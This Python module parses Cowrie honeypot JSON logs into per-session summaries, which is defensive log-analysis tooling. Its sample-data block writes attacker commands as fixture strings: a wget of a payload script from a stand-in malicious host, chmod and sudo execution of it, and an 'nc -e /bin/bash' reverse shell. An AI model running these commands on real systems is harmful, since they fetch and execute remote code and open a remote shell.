"""
Parser module for processing Cowrie JSON logs.
Extracts session information from raw log files.
"""

import json
import logging
from datetime import datetime
from typing import List, Dict, Any

from rich.console import Console

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def load_events(log_path: str) -> List[Dict[str, Any]]:
    """
    Load JSON lines from a Cowrie log file, skipping malformed lines.

    Args:
        log_path (str): Path to the Cowrie JSON log file.

    Returns:
        List[Dict[str, Any]]: A list of parsed event dictionaries.
    """
    events = []
    try:
        with open(log_path, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    events.append(json.loads(line.strip()))
                except json.JSONDecodeError:
                    logging.warning("Skipping malformed JSON line.")
    except IOError as e:
        logging.error(f"Failed to read log file {log_path}: {e}")
    return events

def group_by_session(events: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
    """
    Group events by their session identifier.

    Args:
        events (List[Dict[str, Any]]): List of event dictionaries.

    Returns:
        Dict[str, List[Dict[str, Any]]]: Dictionary mapping session IDs to lists of events.
    """
    sessions: Dict[str, List[Dict[str, Any]]] = {}
    for event in events:
        session_id = event.get("session")
        if session_id:
            sessions.setdefault(session_id, []).append(event)
    return sessions

def build_session(session_id: str, events: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Build a structured session object from a list of events.

    Args:
        session_id (str): The unique session identifier.
        events (List[Dict[str, Any]]): List of events belonging to the session.

    Returns:
        Dict[str, Any]: Structured session dictionary.
    """
    # Sort events by timestamp
    events.sort(key=lambda e: e.get("timestamp", ""))
    
    src_ip = "[TO BE FILLED]"
    start_time = None
    end_time = None
    commands: List[str] = []
    login_success = False
    login_failed_count = 0
    download_count = 0
    upload_count = 0
    
    for event in events:
        event_id = event.get("eventid")
        ts_str = event.get("timestamp")
        
        if ts_str:
            try:
                # Parse timestamp, e.g., "2023-10-27T10:00:00.000Z"
                ts = datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
                if not start_time or ts < start_time:
                    start_time = ts
                if not end_time or ts > end_time:
                    end_time = ts
            except ValueError:
                logging.warning(f"Failed to parse timestamp: {ts_str}")
        
        if event_id == "cowrie.session.connect":
            src_ip = event.get("src_ip", src_ip)
        elif event_id == "cowrie.login.success":
            login_success = True
        elif event_id == "cowrie.login.failed":
            login_failed_count += 1
        elif event_id == "cowrie.command.input":
            cmd = event.get("input")
            if cmd:
                commands.append(cmd)
        elif event_id == "cowrie.session.file_download":
            download_count += 1
        elif event_id == "cowrie.session.file_upload":
            upload_count += 1
            
    duration_sec = 0.0
    if start_time and end_time:
        duration_sec = (end_time - start_time).total_seconds()
        
    return {
        "session_id": session_id,
        "src_ip": src_ip,
        "start_time": start_time.isoformat() if start_time else None,
        "end_time": end_time.isoformat() if end_time else None,
        "duration_sec": duration_sec,
        "commands": commands,
        "command_count": len(commands),
        "login_success": login_success,
        "login_failed_count": login_failed_count,
        "download_count": download_count,
        "upload_count": upload_count,
        "event_count": len(events)
    }

def parse_logs(log_path: str) -> List[Dict[str, Any]]:
    """
    Parse a Cowrie log file into a list of session objects.

    Args:
        log_path (str): Path to the log file.

    Returns:
        List[Dict[str, Any]]: List of parsed sessions.
    """
    events = load_events(log_path)
    grouped = group_by_session(events)
    sessions = []
    for sid, evts in grouped.items():
        sessions.append(build_session(sid, evts))
    return sessions

if __name__ == "__main__":
    import os
    
    console = Console()
    sample_dir = os.path.join("data", "raw")
    os.makedirs(sample_dir, exist_ok=True)
    sample_path = os.path.join(sample_dir, "sample_cowrie.json")
    
    # Create sample data
    sample_events = [
        # Scanner session
        {"session": "s1", "eventid": "cowrie.session.connect", "src_ip": "192.168.1.100", "timestamp": "2023-10-01T12:00:00Z"},
        {"session": "s1", "eventid": "cowrie.login.failed", "timestamp": "2023-10-01T12:00:01Z"},
        {"session": "s1", "eventid": "cowrie.login.success", "timestamp": "2023-10-01T12:00:02Z"},
        {"session": "s1", "eventid": "cowrie.command.input", "input": "uname -a", "timestamp": "2023-10-01T12:00:03Z"},
        {"session": "s1", "eventid": "cowrie.command.input", "input": "whoami", "timestamp": "2023-10-01T12:00:04Z"},
        {"session": "s1", "eventid": "cowrie.session.closed", "timestamp": "2023-10-01T12:00:05Z"},
        # Advanced session
        {"session": "s2", "eventid": "cowrie.session.connect", "src_ip": "10.0.0.50", "timestamp": "2023-10-01T13:00:00Z"},
        {"session": "s2", "eventid": "cowrie.login.success", "timestamp": "2023-10-01T13:00:05Z"},
        {"session": "s2", "eventid": "cowrie.command.input", "input": "wget http://malicious.com/payload.sh", "timestamp": "2023-10-01T13:01:00Z"},
        {"session": "s2", "eventid": "cowrie.session.file_download", "timestamp": "2023-10-01T13:01:05Z"},
        {"session": "s2", "eventid": "cowrie.command.input", "input": "chmod +x payload.sh", "timestamp": "2023-10-01T13:01:10Z"},
        {"session": "s2", "eventid": "cowrie.command.input", "input": "sudo ./payload.sh", "timestamp": "2023-10-01T13:02:00Z"},
        {"session": "s2", "eventid": "cowrie.command.input", "input": "nc -e /bin/bash 10.0.0.50 4444", "timestamp": "2023-10-01T13:05:00Z"},
        {"session": "s2", "eventid": "cowrie.session.closed", "timestamp": "2023-10-01T13:10:00Z"}
    ]
    
    try:
        with open(sample_path, 'w', encoding='utf-8') as f:
            for evt in sample_events:
                f.write(json.dumps(evt) + "\n")
    except IOError as e:
        logging.error(f"Failed to write sample data: {e}")
        
    parsed_sessions = parse_logs(sample_path)
    console.print("Parsed Sessions:", style="bold green")
    console.print(parsed_sessions)
